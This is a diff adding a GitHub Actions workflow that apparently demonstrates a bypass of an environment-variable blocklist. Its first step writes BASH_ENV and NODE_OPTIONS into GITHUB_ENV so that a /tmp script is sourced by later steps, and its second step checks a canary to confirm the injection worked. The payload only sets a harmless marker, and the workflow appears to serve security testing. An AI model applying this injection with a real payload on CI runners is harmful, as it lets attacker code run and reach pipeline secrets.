@@ -1,0 +1,23 @@
+name: GITHUB_ENV Blocklist Verification
+on: workflow_dispatch
+jobs:
+  verify-blocklist:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 - Set BASH_ENV via GITHUB_ENV
+        run: |
+          echo '#!/bin/bash' > /tmp/bashenv_payload.sh
+          echo 'export BASHENV_CANARY=BLOCKLIST_BYPASS_PROVEN_2026' >> /tmp/bashenv_payload.sh
+          echo "BASH_ENV=/tmp/bashenv_payload.sh" >> $GITHUB_ENV
+          echo "NODE_OPTIONS=--require=/tmp/test.js" >> $GITHUB_ENV 2>&1 || true
+          echo "Step 1 complete: BASH_ENV and NODE_OPTIONS written to GITHUB_ENV"
+
+      - name: Step 2 - Check if BASH_ENV was sourced
+        run: |
+          echo "BASH_ENV=$BASH_ENV"
+          echo "BASHENV_CANARY=$BASHENV_CANARY"
+          if [ "$BASHENV_CANARY" = "BLOCKLIST_BYPASS_PROVEN_2026" ]; then
+            echo "FINDING: BASH_ENV injection WORKS - payload sourced before this step"
+          else
+            echo "BASH_ENV injection did NOT work"
+          fi
